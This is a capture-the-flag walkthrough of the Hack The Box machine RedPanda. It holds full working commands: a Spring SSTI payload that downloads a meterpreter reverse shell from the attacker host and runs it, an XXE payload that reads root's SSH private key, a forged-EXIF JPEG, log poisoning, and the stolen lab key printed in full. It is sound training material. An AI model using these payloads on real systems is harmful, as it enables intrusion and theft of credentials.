# Target
| Category          | Details                                             |
|-------------------|-----------------------------------------------------|
| 📝 **Name**       | [RedPanda](https://app.hackthebox.com/machines/481) |  
| 🏷 **Type**       | HTB Machine                                         |
| 🖥 **OS**         | Linux                                               |
| 🎯 **Difficulty** | Easy                                                |
| 📁 **Tags**       | Java, Spring Boot, SSTI, XXE                        |

# Scan
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http    Apache Tomcat (language: en)
|_http-title: Red Panda Search | Made with Spring Boot
```

# Attack path
1. [Gain initial foothold using reverse shell connection spawned with RCE due to SSTI in web application](#gain-initial-foothold-using-reverse-shell-connection-spawned-with-rce-due-to-ssti-in-web-application)
2. [Escalate to `root` user using SSH private key exfiltrated with XXE](#escalate-to-root-user-using-ssh-private-key-exfiltrated-with-xxe)

### Gain initial foothold using reverse shell connection spawned with RCE due to SSTI in web application

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB RedPanda]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload linux/x86/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => linux/x86/meterpreter/reverse_tcp
```

#### Generate and host `linux/x86/meterpreter/reverse_tcp` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB RedPanda]
└─$ msfvenom -p linux/x86/meterpreter/reverse_tcp \
    LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
    LPORT=4444 \
    -f elf \
    -o shell && \
python3 -m http.server
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: shell
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Download and execute generated reverse shell using SSTI
```
LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
curl -s http://$TARGET:8080/search -d "name=*{T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", \"wget -P /tmp http://$LHOST:8000/shell;chmod 777 /tmp/shell;/tmp/shell\"})}" -o /dev/null
```

#### Gain foothold with reverse shell connection
```
[*] Sending stage (1017704 bytes) to 10.129.227.207
[*] Meterpreter session 1 opened (10.10.14.157:4444 -> 10.129.227.207:42460) at 2025-06-20 13:18:02 +0200

meterpreter > getuid
Server username: woodenk
```

### Escalate to `root` user using SSH private key exfiltrated with XXE

#### Identify `final-1.0-jar-with-dependencies.jar` being periodically run by `root`
`pspy` shows `root` periodically running `java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar`
```
2025/06/20 11:48:01 CMD: UID=0     PID=2897   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
```

#### Identify Path traversal and XXE vulnerabilities in `LogParser`
Due to path traversal in 43 and 104 we can prepare .jpg payload with forged `Artist` metadata and point it in `/opt/panda_search/redpanda.log` to trigger XXE in 61.
```
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cat -n /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java
<SNIP>
    23      public static Map parseLog(String line) {
    24          String[] strings = line.split("\\|\\|");
    25          Map map = new HashMap<>();
    26          map.put("status_code", Integer.parseInt(strings[0]));
    27          map.put("ip", strings[1]);
    28          map.put("user_agent", strings[2]);
    29          map.put("uri", strings[3]);
<SNIP>
    41      public static String getArtist(String uri) throws IOException, JpegProcessingException
    42      {
    43          String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
    44          File jpgFile = new File(fullpath);
    45          Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
    46          for(Directory dir : metadata.getDirectories())
    47          {
    48              for(Tag tag : dir.getTags())
    49              {
    50                  if(tag.getTagName() == "Artist")
    51                  {
    52                      return tag.getDescription();
    53                  }
    54              }
    55          }
    56
    57          return "N/A";
    58      }
    59      public static void addViewTo(String path, String uri) throws JDOMException, IOException
    60      {
<SNIP>
    61          SAXBuilder saxBuilder = new SAXBuilder();
<SNIP>    
    90      public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
    91          File log_fd = new File("/opt/panda_search/redpanda.log");
<SNIP>
   100              Map parsed_data = parseLog(line);
   101              System.out.println(parsed_data.get("uri"));
   102              String artist = getArtist(parsed_data.get("uri").toString());
   103              System.out.println("Artist: " + artist);
   104              String xmlPath = "/credits/" + artist + "_creds.xml";
   105              addViewTo(xmlPath, parsed_data.get("uri").toString());
<SNIP>
```

#### Spawn stable shell
```
meterpreter > shell
Process 2423 created.
Channel 2 created.
/usr/bin/script -qc /bin/bash /dev/null
woodenk@redpanda:/tmp/hsperfdata_woodenk$
```

#### Prepare `payload_creds.xml` with XXE for `/root/.ssh/id_rsa` extraction
```
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cat <<'EOF'> /tmp/payload_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE poc [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
<root>&xxe;</root>
EOF
```

#### Prepare `payload.jpg` with `Artist` metadata pointing to XXE payload
Payload prepared with following Python script: 
```python
from PIL import Image
import piexif

exif = piexif.dump({"0th": {piexif.ImageIFD.Artist: b"../tmp/payload"}})
Image.new("RGB", (1, 1), color="white").save("payload.jpg", exif=exif)
```

```
woodenk@redpanda:/tmp/hsperfdata_woodenk$ echo \
"/9j/4AAQSkZJRgABAQAAAQABAAD/4QAxRXhpZgAATU0AKgAAAAgAAQE7AAIAAAAPAAAAGgAAAAAu
Li90bXAvcGF5bG9hZAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4n
ICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIy
MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB
/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQID
AAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RF
RkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKz
tLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEB
AQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdh
cRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldY
WVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPE
xcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD3+iiigD//2Q==" \
| base64 -d > /tmp/payload.jpg
```

#### Poison `redpanda.log` to trigger XXE
```
woodenk@redpanda:/tmp/hsperfdata_woodenk$ echo "200||127.0.0.1||UserAgent||/../../../../../../tmp/payload.jpg" > /opt/panda_search/redpanda.log
```

#### Wait for XXE to inject `root` SSH private key
```
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cat /tmp/payload_creds.xml
cat /tmp/payload_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE poc>
<root>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</root>
```

#### Exfiltrate and use SSH private key to escalate to root
```
┌──(magicrc㉿perun)-[~/attack/HTB RedPanda]
└─$ { cat <<'EOF'> redpanda_id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----
EOF
} && chmod 600 redpanda_id_rsa && ssh root@$TARGET -i redpanda_id_rsa
<SNIP>
root@redpanda:~# id
uid=0(root) gid=0(root) groups=0(root)
```